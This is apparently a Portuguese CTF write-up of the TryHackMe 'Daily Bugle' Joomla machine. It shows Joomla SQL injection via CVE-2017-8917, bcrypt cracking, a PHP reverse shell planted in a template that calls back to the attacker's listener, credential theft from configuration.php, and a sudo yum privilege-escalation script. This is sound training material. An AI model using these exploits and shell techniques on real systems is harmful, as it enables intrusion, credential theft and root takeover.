# Daily Bugle

Selecionar: Hard

Escopo: 10.201.6.75

Explicação (***Write-ups***):

Iniciamos com uma enumeração de portas de comunicação, utilizando a ferramenta Nmap para identificar serviços ativos:

```sql
nmap -sS -sVC -p- 10.201.6.75 --open -T4
```

```sql
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
```

Ao visitarmos a aplicação, nos deparamos com uma noticia do jornal  Daily Bugle noticiando que o Spider-Man,  havia roubado um banco.

![Captura de tela 2025-11-11 022552.png](Captura_de_tela_2025-11-11_022552.png)

Em seguida, realizamos uma enumeração de diretórios em busca de arquivos e diretórios ocultos utilizando a ferramenta ffuf

```sql
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://10.201.6.75/FUZZ -t 150
```

```sql

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.201.6.75/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 150
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 1698ms]
.htpasswd               [Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 5751ms]
administrator           [Status: 301, Size: 241, Words: 14, Lines: 8, Duration: 271ms]
bin                     [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 273ms]
cache                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 273ms]
cgi-bin/                [Status: 403, Size: 210, Words: 15, Lines: 9, Duration: 269ms]
cli                     [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 287ms]
components              [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 411ms]
images                  [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 269ms]
includes                [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 272ms]
language                [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 272ms]
layouts                 [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 269ms]
libraries               [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 268ms]
media                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 270ms]
modules                 [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 271ms]
plugins                 [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 268ms]
robots.txt              [Status: 200, Size: 836, Words: 88, Lines: 33, Duration: 274ms]
templates               [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 270ms]
tmp                     [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 270ms]
```

Ao acessar o diretório `/administrator` identificamos o CMS joomla, que exigia credenciais válidas! 

![Captura de tela 2025-11-11 023852.png](Captura_de_tela_2025-11-11_023852.png)

Para identificarmos a versão do Joomla utilizamos  a ferramenta joomscan:

```perl
https://github.com/OWASP/joomscan/blob/master/README.md
```

```perl
perl joomscan.pl --url http://10.201.6.75/administrator
```

```perl
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.201.6.75/administrator ...

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.201.6.75/administrator/components
http://10.201.6.75/administrator/modules
http://10.201.6.75/administrator/templates
http://10.201.6.75/administrator/includes
http://10.201.6.75/administrator/language
http://10.201.6.75/administrator/templates
```

Com a versão do CMS, identificamos a vulnerabilidade  `CVE-2017-8917`  que permite que um atacante mesmo que **não autenticado** injete comandos SQL arbitrários via requisições HTTP (GET/POST), explorando parâmetros vulneráveis.

![Captura de tela 2025-11-11 031110.png](Captura_de_tela_2025-11-11_031110.png)

Para explorarmos essa vulnerabilidade utilizamos a ferramenta joomblah:

```perl
python3 joomblah.py http://10.201.6.75
```

```perl
https://github.com/XiphosResearch/exploits/blob/master/Joomblah/README.md
```

```perl
                                                                                                                  
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Ao obtermos uma hash Bcrypt no campo ‘Found user’, utilizamos a ferramenta Hashcat para quebrar essa hash,  e obtemos a senha do usuário jonah

```perl
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

```perl
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
```

Com as credenciais válidas, conseguimos obter acesso ao joomla e posteriormente ao acessar a sessão templates nos deparamos com dois modelos de template

```perl
Extensions -> Templates -> Templates
```

![Captura de tela 2025-11-11 040133.png](Captura_de_tela_2025-11-11_040133.png)

Em seguida, acessamos o template `protostar` e identificamos que poderíamos criar um novo arquivo e  instalar uma shell reversa, colando o código da shell (PentestMonkey) no diretório index.php onde ao fazer uma requisição com o IP do index.php a shell é feita.

```sql
https://pentestmonkey.net/
```

```perl
nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.21.41.234] from (UNKNOWN) [10.201.6.75] 45954
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 02:18:50 up  2:07,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell

```

com conexão *nc -lvnp 4444* para minha máquina, além de utilizar os comando

```perl
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL Z
stty -echo raw; fg
stty rows 38 columns 116
```

Em seguida, percebemos que não conseguimos acessar o diretório do usuário jjameson, mas acessando o diretório `configuration.php` localizado em:

```perl
var/www/html
```

Conseguimos obter a senha ‘nv5uz9r3ZEDzVjNu’ do usuário alvo, a validando ao acessar o serviço SSH nos permitindo obter a flag 

```perl
ssh jjameson@10.201.6.75
```

```perl
27a260fe3cba712cfdedb1c86d80442
```

Ao rodar o comando ‘sudo -l’ identificamos que nosso usuário jjameson pode executar o comando NOPASSWD

```perl
/usr/bin/yum
```

Procurando no GTFobins identificamos uma maneira de escalar privilégio através desse Binário seguindo esse passo a passo:

```sql
https://gtfobins.github.io/gtfobins/yum/
```

```perl
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

Em seguida obtemos a flag do usuário root

```perl
eec3d53292b1821868266858d7fa6f79
```